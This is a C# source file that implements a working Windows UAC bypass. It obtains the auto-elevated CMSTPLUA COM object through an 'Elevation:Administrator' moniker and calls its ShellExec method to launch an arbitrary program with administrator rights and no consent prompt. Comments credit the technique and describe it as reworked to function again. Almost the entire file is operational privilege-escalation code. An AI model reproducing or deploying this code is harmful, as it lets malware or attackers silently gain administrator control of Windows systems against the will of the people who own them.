using System;
using System.Runtime.InteropServices;
using System.Text;
using static Special.Commons;

/*
|| AUTHOR : UAC bypass method from Oddvar Moe aka api0cradle. ||
            * ucmCMLuaUtilShellExecMethod
            *
            * Purpose:
            *
            * Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
            * This function expects that supMasqueradeProcess was called on process initialization.
            *
|| Original C# version :  https://github.com/0xlane/BypassUAC ||
|| github : https://github.com/arsium       ||
|| This method combines PEB masquerading + abusing com object. Reworked imports in C# to make it working again :) ||
*/

namespace Special
{
    internal class COM
    {
        private unsafe static object LaunchElevatedCOMObjectUnsafe(Guid Clsid, Guid InterfaceID)
        {
            string CLSID = Clsid.ToString("B"); // B formatting directive: returns {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} 
            string monikerName = "Elevation:Administrator!new:" + CLSID;

            BIND_OPTS3 bo = new BIND_OPTS3();
            bo.cbStruct = (uint)Marshal.SizeOf(bo);
            bo.dwClassContext = (int)CLSCTX.CLSCTX_LOCAL_SERVER;
            void* retVal;

            int h = coGetObject(Encoding.Unicode.GetBytes(monikerName), &bo, &InterfaceID, &retVal);
            if (h != 0) return null;

            return Marshal.GetObjectForIUnknown((IntPtr)retVal);
        }

        internal unsafe static Launch.HRESULT Start(string filePath, string param = null)
        {
            //3E5FC7F9-9A51-4367-9063-A120244FBEC7 - CMSTPLUA

            Guid classId = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");

            //6EDD6D74-C007-4E75-B76A-E5740995E24C //ICMLuaUtil
            //6EF07F29-F9B8-4DA4-B59E-13DEA060AD60 //ICmstpLua      
            //AE8AFD54-5B57-4961-8A9B-12ADF23B696A //ICmstpLua2

            Guid interfaceId = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

            object elvObject = LaunchElevatedCOMObjectUnsafe(classId, interfaceId);

            if (elvObject != null)
            {
                ILua ihw = (ILua)elvObject;
                ihw.ShellExec(filePath, null, null, 0, 5);
                Marshal.ReleaseComObject(elvObject);
                return Launch.HRESULT.S_OK;
            }
            return Launch.HRESULT.S_FALSE;
        }
    }
}
